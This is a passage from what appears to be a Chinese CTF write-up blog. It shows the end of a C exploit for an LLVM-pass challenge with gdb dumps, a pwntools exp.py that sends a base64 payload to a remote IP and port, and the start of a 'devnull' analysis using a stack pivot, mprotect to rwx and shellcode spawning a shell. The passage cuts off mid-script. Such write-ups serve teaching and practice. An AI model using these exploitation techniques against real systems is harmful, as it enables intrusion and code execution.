function_">n314</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n315</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n316</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n317</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n318</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n319</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n320</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n321</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n322</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n323</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n324</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n325</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n326</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n327</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n328</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gamestart</span><span class="hljs-params">()</span><br>&#123;<br><br>n0(<span class="hljs-number">1</span>);<br>n1(<span class="hljs-number">1</span>);<br>n2(<span class="hljs-number">1</span>);<br>n3(<span class="hljs-number">1</span>);<br>n4(<span class="hljs-number">1</span>);<br>n5(<span class="hljs-number">1</span>);<br>n6(<span class="hljs-number">1</span>);<br>n7(<span class="hljs-number">1</span>);<br>n8(<span class="hljs-number">1</span>);<br>n9(<span class="hljs-number">1</span>);<br>n10(<span class="hljs-number">1</span>);<br>n11(<span class="hljs-number">1</span>);<br>n12(<span class="hljs-number">1</span>);<br>n13(<span class="hljs-number">1</span>);<br>n14(<span class="hljs-number">1</span>);<br>n15(<span class="hljs-number">1</span>);<br>n16(<span class="hljs-number">1</span>);<br>n17(<span class="hljs-number">1</span>);<br>n18(<span class="hljs-number">1</span>);<br>n19(<span class="hljs-number">1</span>);<br>n20(<span class="hljs-number">1</span>);<br>n21(<span class="hljs-number">1</span>);<br>n22(<span class="hljs-number">1</span>);<br>n23(<span class="hljs-number">1</span>);<br>n24(<span class="hljs-number">1</span>);<br>n25(<span class="hljs-number">1</span>);<br>n26(<span class="hljs-number">1</span>);<br>n27(<span class="hljs-number">1</span>);<br>n28(<span class="hljs-number">1</span>);<br>n29(<span class="hljs-number">1</span>);<br>n30(<span class="hljs-number">1</span>);<br>n31(<span class="hljs-number">1</span>);<br>n32(<span class="hljs-number">1</span>);<br>n33(<span class="hljs-number">1</span>);<br>n34(<span class="hljs-number">1</span>);<br>n35(<span class="hljs-number">1</span>);<br>n36(<span class="hljs-number">1</span>);<br>n37(<span class="hljs-number">1</span>);<br>n38(<span class="hljs-number">1</span>);<br>n39(<span class="hljs-number">1</span>);<br>n40(<span class="hljs-number">1</span>);<br>n41(<span class="hljs-number">1</span>);<br>n42(<span class="hljs-number">1</span>);<br>n43(<span class="hljs-number">1</span>);<br>n44(<span class="hljs-number">1</span>);<br>n45(<span class="hljs-number">1</span>);<br>n46(<span class="hljs-number">1</span>);<br>n47(<span class="hljs-number">1</span>);<br>n48(<span class="hljs-number">1</span>);<br>n49(<span class="hljs-number">1</span>);<br>n50(<span class="hljs-number">1</span>);<br>n51(<span class="hljs-number">1</span>);<br>n52(<span class="hljs-number">1</span>);<br>n53(<span class="hljs-number">1</span>);<br>n54(<span class="hljs-number">1</span>);<br>n55(<span class="hljs-number">1</span>);<br>n56(<span class="hljs-number">1</span>);<br>n57(<span class="hljs-number">1</span>);<br>n58(<span class="hljs-number">1</span>);<br>n59(<span class="hljs-number">1</span>);<br>n60(<span class="hljs-number">1</span>);<br>n61(<span class="hljs-number">1</span>);<br>n62(<span class="hljs-number">1</span>);<br>n63(<span class="hljs-number">1</span>);<br>n64(<span class="hljs-number">1</span>);<br>n65(<span class="hljs-number">1</span>);<br>n66(<span class="hljs-number">1</span>);<br>n67(<span class="hljs-number">1</span>);<br>n68(<span class="hljs-number">1</span>);<br>n69(<span class="hljs-number">1</span>);<br>n70(<span class="hljs-number">1</span>);<br>n71(<span class="hljs-number">1</span>);<br>n72(<span class="hljs-number">1</span>);<br>n73(<span class="hljs-number">1</span>);<br>n74(<span class="hljs-number">1</span>);<br>n75(<span class="hljs-number">1</span>);<br>n76(<span class="hljs-number">1</span>);<br>n77(<span class="hljs-number">1</span>);<br>n78(<span class="hljs-number">1</span>);<br>n79(<span class="hljs-number">1</span>);<br>n80(<span class="hljs-number">1</span>);<br>n81(<span class="hljs-number">1</span>);<br>n82(<span class="hljs-number">1</span>);<br>n83(<span class="hljs-number">1</span>);<br>n84(<span class="hljs-number">1</span>);<br>n85(<span class="hljs-number">1</span>);<br>n86(<span class="hljs-number">1</span>);<br>n87(<span class="hljs-number">1</span>);<br>n88(<span class="hljs-number">1</span>);<br>n89(<span class="hljs-number">1</span>);<br>n90(<span class="hljs-number">1</span>);<br>n91(<span class="hljs-number">1</span>);<br>n92(<span class="hljs-number">1</span>);<br>n93(<span class="hljs-number">1</span>);<br>n94(<span class="hljs-number">1</span>);<br>n95(<span class="hljs-number">1</span>);<br>n96(<span class="hljs-number">1</span>);<br>n97(<span class="hljs-number">1</span>);<br>n98(<span class="hljs-number">1</span>);<br>n99(<span class="hljs-number">1</span>);<br>n100(<span class="hljs-number">1</span>);<br>n101(<span class="hljs-number">1</span>);<br>n102(<span class="hljs-number">1</span>);<br>n103(<span class="hljs-number">1</span>);<br>n104(<span class="hljs-number">1</span>);<br>n105(<span class="hljs-number">1</span>);<br>n106(<span class="hljs-number">1</span>);<br>n107(<span class="hljs-number">1</span>);<br>n108(<span class="hljs-number">1</span>);<br>n109(<span class="hljs-number">1</span>);<br>n110(<span class="hljs-number">1</span>);<br>n111(<span class="hljs-number">1</span>);<br>n112(<span class="hljs-number">1</span>);<br>n113(<span class="hljs-number">1</span>);<br>n114(<span class="hljs-number">1</span>);<br>n115(<span class="hljs-number">1</span>);<br>n116(<span class="hljs-number">1</span>);<br>n117(<span class="hljs-number">1</span>);<br>n118(<span class="hljs-number">1</span>);<br>n119(<span class="hljs-number">1</span>);<br>n120(<span class="hljs-number">1</span>);<br>n121(<span class="hljs-number">1</span>);<br>n122(<span class="hljs-number">1</span>);<br>n123(<span class="hljs-number">1</span>);<br>n124(<span class="hljs-number">1</span>);<br>n125(<span class="hljs-number">1</span>);<br>n126(<span class="hljs-number">1</span>);<br>n127(<span class="hljs-number">1</span>);<br>n128(<span class="hljs-number">1</span>);<br>n129(<span class="hljs-number">1</span>);<br>n130(<span class="hljs-number">1</span>);<br>n131(<span class="hljs-number">1</span>);<br>n132(<span class="hljs-number">1</span>);<br>n133(<span class="hljs-number">1</span>);<br>n134(<span class="hljs-number">1</span>);<br>n135(<span class="hljs-number">1</span>);<br>n136(<span class="hljs-number">1</span>);<br>n137(<span class="hljs-number">1</span>);<br>n138(<span class="hljs-number">1</span>);<br>n139(<span class="hljs-number">1</span>);<br>n140(<span class="hljs-number">1</span>);<br>n141(<span class="hljs-number">1</span>);<br>n142(<span class="hljs-number">1</span>);<br>n143(<span class="hljs-number">1</span>);<br>n144(<span class="hljs-number">1</span>);<br>n145(<span class="hljs-number">1</span>);<br>n146(<span class="hljs-number">1</span>);<br>n147(<span class="hljs-number">1</span>);<br>n148(<span class="hljs-number">1</span>);<br>n149(<span class="hljs-number">1</span>);<br>n150(<span class="hljs-number">1</span>);<br>n151(<span class="hljs-number">1</span>);<br>n152(<span class="hljs-number">1</span>);<br>n153(<span class="hljs-number">1</span>);<br>n154(<span class="hljs-number">1</span>);<br>n155(<span class="hljs-number">1</span>);<br>n156(<span class="hljs-number">1</span>);<br>n157(<span class="hljs-number">1</span>);<br>n158(<span class="hljs-number">1</span>);<br>n159(<span class="hljs-number">1</span>);<br>n160(<span class="hljs-number">1</span>);<br>n161(<span class="hljs-number">1</span>);<br>n162(<span class="hljs-number">1</span>);<br>n163(<span class="hljs-number">1</span>);<br>n164(<span class="hljs-number">1</span>);<br>n165(<span class="hljs-number">1</span>);<br>n166(<span class="hljs-number">1</span>);<br>n167(<span class="hljs-number">1</span>);<br>n168(<span class="hljs-number">1</span>);<br>n169(<span class="hljs-number">1</span>);<br>n170(<span class="hljs-number">1</span>);<br>n171(<span class="hljs-number">1</span>);<br>n172(<span class="hljs-number">1</span>);<br>n173(<span class="hljs-number">1</span>);<br>n174(<span class="hljs-number">1</span>);<br>n175(<span class="hljs-number">1</span>);<br>n176(<span class="hljs-number">1</span>);<br>n177(<span class="hljs-number">1</span>);<br>n178(<span class="hljs-number">1</span>);<br>n179(<span class="hljs-number">1</span>);<br>n180(<span class="hljs-number">1</span>);<br>n181(<span class="hljs-number">1</span>);<br>n182(<span class="hljs-number">1</span>);<br>n183(<span class="hljs-number">1</span>);<br>n184(<span class="hljs-number">1</span>);<br>n185(<span class="hljs-number">1</span>);<br>n186(<span class="hljs-number">1</span>);<br>n187(<span class="hljs-number">1</span>);<br>n188(<span class="hljs-number">1</span>);<br>n189(<span class="hljs-number">1</span>);<br>n190(<span class="hljs-number">1</span>);<br>n191(<span class="hljs-number">1</span>);<br>n192(<span class="hljs-number">1</span>);<br>n193(<span class="hljs-number">1</span>);<br>n194(<span class="hljs-number">1</span>);<br>n195(<span class="hljs-number">1</span>);<br>n196(<span class="hljs-number">1</span>);<br>n197(<span class="hljs-number">1</span>);<br>n198(<span class="hljs-number">1</span>);<br>n199(<span class="hljs-number">1</span>);<br>n200(<span class="hljs-number">1</span>);<br>n201(<span class="hljs-number">1</span>);<br>n202(<span class="hljs-number">1</span>);<br>n203(<span class="hljs-number">1</span>);<br>n204(<span class="hljs-number">1</span>);<br>n205(<span class="hljs-number">1</span>);<br>n206(<span class="hljs-number">1</span>);<br>n207(<span class="hljs-number">1</span>);<br>n208(<span class="hljs-number">1</span>);<br>n209(<span class="hljs-number">1</span>);<br>n210(<span class="hljs-number">1</span>);<br>n211(<span class="hljs-number">1</span>);<br>n212(<span class="hljs-number">1</span>);<br>n213(<span class="hljs-number">1</span>);<br>n214(<span class="hljs-number">1</span>);<br>n215(<span class="hljs-number">1</span>);<br>n216(<span class="hljs-number">1</span>);<br>n217(<span class="hljs-number">1</span>);<br>n218(<span class="hljs-number">1</span>);<br>n219(<span class="hljs-number">1</span>);<br>n220(<span class="hljs-number">1</span>);<br>n221(<span class="hljs-number">1</span>);<br>n222(<span class="hljs-number">1</span>);<br>n223(<span class="hljs-number">1</span>);<br>n224(<span class="hljs-number">1</span>);<br>n225(<span class="hljs-number">1</span>);<br>n226(<span class="hljs-number">1</span>);<br>n227(<span class="hljs-number">1</span>);<br>n228(<span class="hljs-number">1</span>);<br>n229(<span class="hljs-number">1</span>);<br>n230(<span class="hljs-number">1</span>);<br>n231(<span class="hljs-number">1</span>);<br>n232(<span class="hljs-number">1</span>);<br>n233(<span class="hljs-number">1</span>);<br>n234(<span class="hljs-number">1</span>);<br>n235(<span class="hljs-number">1</span>);<br>n236(<span class="hljs-number">1</span>);<br>n237(<span class="hljs-number">1</span>);<br>n238(<span class="hljs-number">1</span>);<br>n239(<span class="hljs-number">1</span>);<br>n240(<span class="hljs-number">1</span>);<br>n241(<span class="hljs-number">1</span>);<br>n242(<span class="hljs-number">1</span>);<br>n243(<span class="hljs-number">1</span>);<br>n244(<span class="hljs-number">1</span>);<br>n245(<span class="hljs-number">1</span>);<br>n246(<span class="hljs-number">1</span>);<br>n247(<span class="hljs-number">1</span>);<br>n248(<span class="hljs-number">1</span>);<br>n249(<span class="hljs-number">1</span>);<br>n250(<span class="hljs-number">1</span>);<br>n251(<span class="hljs-number">1</span>);<br>n252(<span class="hljs-number">1</span>);<br>n253(<span class="hljs-number">1</span>);<br>n254(<span class="hljs-number">1</span>);<br>n255(<span class="hljs-number">1</span>);<br>n256(<span class="hljs-number">1</span>);<br>n257(<span class="hljs-number">1</span>);<br>n258(<span class="hljs-number">1</span>);<br>n259(<span class="hljs-number">1</span>);<br>n260(<span class="hljs-number">1</span>);<br>n261(<span class="hljs-number">1</span>);<br>n262(<span class="hljs-number">1</span>);<br>n263(<span class="hljs-number">1</span>);<br>n264(<span class="hljs-number">1</span>);<br>n265(<span class="hljs-number">1</span>);<br>n266(<span class="hljs-number">1</span>);<br>n267(<span class="hljs-number">1</span>);<br>n268(<span class="hljs-number">1</span>);<br>n269(<span class="hljs-number">1</span>);<br>n270(<span class="hljs-number">1</span>);<br>n271(<span class="hljs-number">1</span>);<br>n272(<span class="hljs-number">1</span>);<br>n273(<span class="hljs-number">1</span>);<br>n274(<span class="hljs-number">1</span>);<br>n275(<span class="hljs-number">1</span>);<br>n276(<span class="hljs-number">1</span>);<br>n277(<span class="hljs-number">1</span>);<br>n278(<span class="hljs-number">1</span>);<br>n279(<span class="hljs-number">1</span>);<br>n280(<span class="hljs-number">1</span>);<br>n281(<span class="hljs-number">1</span>);<br>n282(<span class="hljs-number">1</span>);<br>n283(<span class="hljs-number">1</span>);<br>n284(<span class="hljs-number">1</span>);<br>n285(<span class="hljs-number">1</span>);<br>n286(<span class="hljs-number">1</span>);<br>n287(<span class="hljs-number">1</span>);<br>n288(<span class="hljs-number">1</span>);<br>n289(<span class="hljs-number">1</span>);<br>n290(<span class="hljs-number">1</span>);<br>n291(<span class="hljs-number">1</span>);<br>n292(<span class="hljs-number">1</span>);<br>n293(<span class="hljs-number">1</span>);<br>n294(<span class="hljs-number">1</span>);<br>n295(<span class="hljs-number">1</span>);<br>n296(<span class="hljs-number">1</span>);<br>n297(<span class="hljs-number">1</span>);<br>n298(<span class="hljs-number">1</span>);<br>n299(<span class="hljs-number">1</span>);<br>n300(<span class="hljs-number">1</span>);<br>n301(<span class="hljs-number">1</span>);<br>n302(<span class="hljs-number">1</span>);<br>n303(<span class="hljs-number">1</span>);<br>n304(<span class="hljs-number">1</span>);<br>n305(<span class="hljs-number">1</span>);<br>n306(<span class="hljs-number">1</span>);<br>n307(<span class="hljs-number">0x29</span>);<br>n308(<span class="hljs-number">0x22</span>);<br>n309(<span class="hljs-number">0x41</span>);<br>n310(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// opt-8           0x412229 jae    0x412293 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x42c7df jae    0x42c849 /* &#x27;shift_div&#x27; */</span><br><span class="hljs-comment">// opt-8           0x42cbd7 jae    0x42cc41 /* &#x27;sh_nonemptyEv&#x27; */</span><br><span class="hljs-comment">// opt-8           0x432faa jae    0x433014 /* &#x27;shifted_simple_hull_from_set_list&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4330aa jae    0x433114 /* &#x27;shifted_simple_hull_from_map_list&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434c56 jae    0x434cc0 /* &#x27;sh_table_init&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434dc9 jae    0x434e33 /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434de6 jae    0x434e50 /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434e03 jae    0x434e6d /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x437414 jae    0x43747e /* &#x27;sh_bits&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4375a5 jae    0x43760f /* &#x27;shift_point_loops&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4375cc jae    0x437636 /* &#x27;shift_point_loops&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43791b jae    0x437985 /* &#x27;sh_tokens&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43963f jae    0x4396a9 /* &#x27;sh_basis&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43bab0 jae    0x43bb1a /* &#x27;shared_ancestor&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c7be jae    0x43c828 /* &#x27;shift_var&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c81e jae    0x43c888 /* &#x27;sh_var&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c88b jae    0x43c8f5 /* &#x27;sh_table_clear&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4413d4 jae    0x44143e /* &#x27;sh_token&#x27; */</span><br><span class="hljs-comment">// opt-8           0x441c6e jae    0x441cd8 /* &#x27;sh_mem&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4429c0 jae    0x442a2a /* &#x27;shared_ptrIN5polly12RejectReasonEELb0EE4growEm&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443216 jae    0x443280 /* &#x27;sholdEm&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435b1 jae    0x44361b /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435cf jae    0x443639 /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435f3 jae    0x44365d /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443617 jae    0x443681 /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443641 jae    0x4436ab /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4452b5 jae    0x44531f /* &#x27;sh_callback&#x27; */</span><br><span class="hljs-comment">// opt-8           0x445c12 jae    0x445c7c /* &#x27;shTableEj&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44636c jae    0x4463d6 /* &#x27;shiftDimEN3isl12noexceptions9union_setEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4463a0 jae    0x44640a /* &#x27;shiftDimEN3isl12noexceptions3setEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4463ce jae    0x446438 /* &#x27;shiftDimEN3isl12noexceptions9union_mapENS1_3dimEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44640b jae    0x446475 /* &#x27;shiftDimEN3isl12noexceptions3mapENS1_3dimEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44696b jae    0x4469d5 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x446972 jae    0x4469dc /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x446984 jae    0x4469ee /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44699b jae    0x446a05 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4469ac jae    0x446a16 /* &#x27;sh&#x27; */</span><br><br><br>n311(<span class="hljs-number">1</span>);<br>n312(<span class="hljs-number">1</span>);<br>n313(<span class="hljs-number">1</span>);<br>n314(<span class="hljs-number">0xda</span>);<br>n315(<span class="hljs-number">0xdf</span>);<br>n316(<span class="hljs-number">0x77</span>);<br>n317(<span class="hljs-number">0</span>);<br>n318(<span class="hljs-number">1</span>);<br><br><br><span class="hljs-comment">// n327(1); // -2</span><br><span class="hljs-comment">// n328(1); // -1</span><br><span class="hljs-comment">// n307(1); // cmd</span><br>n316(<span class="hljs-number">1</span>); <span class="hljs-comment">// stdout@got + 2 0x77dfda</span><br>n315(<span class="hljs-number">1</span>); <br>n314(<span class="hljs-number">1</span>); <br>n307(<span class="hljs-number">1</span>); <br>n308(<span class="hljs-number">1</span>); <br>n309(<span class="hljs-number">1</span>); <br>n310(<span class="hljs-number">1</span>); <br><br>fight(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// n264(1); // -1</span><br><span class="hljs-comment">// n328(1); // -1</span><br><span class="hljs-comment">// fight(-2);</span><br><span class="hljs-comment">// fight(-3);</span><br><span class="hljs-comment">// fight(-4);</span><br><span class="hljs-comment">// fight(-5);</span><br><span class="hljs-comment">// fight(-6);</span><br><br><span class="hljs-comment">// merge(-1,0);</span><br><span class="hljs-comment">// merge(-1,-2);</span><br><span class="hljs-comment">// merge(-1,-3);</span><br><span class="hljs-comment">// merge(2,3);</span><br>&#125;<br><span class="hljs-comment">// 0x412229</span><br><span class="hljs-comment">// 0x7ffff4e20750 0x7ffff3b63880 0x7ffff3b641d7</span><br><span class="hljs-comment">// 0x7ffff3b57000 0x6668936d277b6892 0x7ffff3b639e6 0x7ffff3b63af6 0x7ffff3b64278 0x7ffff3b641c5</span><br><span class="hljs-comment">/* 0xD2780x7ffff3b641c5</span><br><span class="hljs-comment"> ► 0x7ffff4e2077e &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)+46&gt;    call   llvm::FPPassManager::runOnFunction(llvm::Function&amp;)                &lt;llvm::FPPassManager::runOnFunction(llvm::Function&amp;)&gt;</span><br><span class="hljs-comment"> 0x4bb7e3 &lt;main+11507&gt;    call   llvm::legacy::PassManager::run(llvm::Module&amp;)@plt  </span><br><span class="hljs-comment"> ► 0x7ffff4e20b48 &lt;llvm::legacy::PassManagerImpl::run(llvm::Module&amp;)+744&gt;    call   qword ptr [rax + 0x88]        &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)&gt;</span><br><span class="hljs-comment">x/50xg 0x7ffff3d6d978</span><br><span class="hljs-comment">0x7ffff3d6d9a8 &lt;cmd&gt;:0x0000000000824d000x0000000000822fb0</span><br><span class="hljs-comment">0x7ffff3d6d9b8:0x00000000000000000x6868686868d06868</span><br><span class="hljs-comment">0x7ffff3d6d9c8 &lt;weaponlist+8&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9d8 &lt;weaponlist+24&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9e8 &lt;weaponlist+40&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9f8 &lt;weaponlist+56&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da08 &lt;weaponlist+72&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da18 &lt;weaponlist+88&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da28 &lt;weaponlist+104&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da38 &lt;weaponlist+120&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da48 &lt;weaponlist+136&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da58 &lt;weaponlist+152&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da68 &lt;weaponlist+168&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da78 &lt;weaponlist+184&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da88 &lt;weaponlist+200&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">wea 2169C0  2169A8</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h4 id="exp-py"><a class="header-anchor" href="#exp-py">¶</a><a href="http://exp.py">exp.py</a></h4><p>用来攻击远程的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python exp.py 123.56.105.22 35252</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp.ll&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br><br>payload=f.read()<br><br>f.close()<br><br>payload2 = payload.encode(<span class="hljs-string">&quot;base64&quot;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;give&quot;</span>, payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="devnull"><a class="header-anchor" href="#devnull">¶</a>devnull</h3><h4 id="分析-v3"><a class="header-anchor" href="#分析-v3">¶</a>分析</h4><p>存在栈溢出，可以覆盖掉 fd 的同时覆盖掉 rbp 和 rip，考虑栈迁移。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133726905.png" alt="devnull1"></p><p>看到控制执行流时 rdx 为 7。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133853102.png" alt="devnull2"></p><p>比较突兀的 strlen 中，有控制 rax 的 gadget。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133935959.png" alt="devnull3"></p><p>配合 mprotect 可以扬成 rwx 权限。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731134022615.png" alt="devnull4"></p><p>读入第一段 shellcode 扩大输入字节数，然后直接调 <a href="http://shellcraft.sh">shellcraft.sh</a>() 即可，注意的是输出流被关闭了，执行 <code>exec 1&gt;&amp;0</code> 恢复就行。</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span 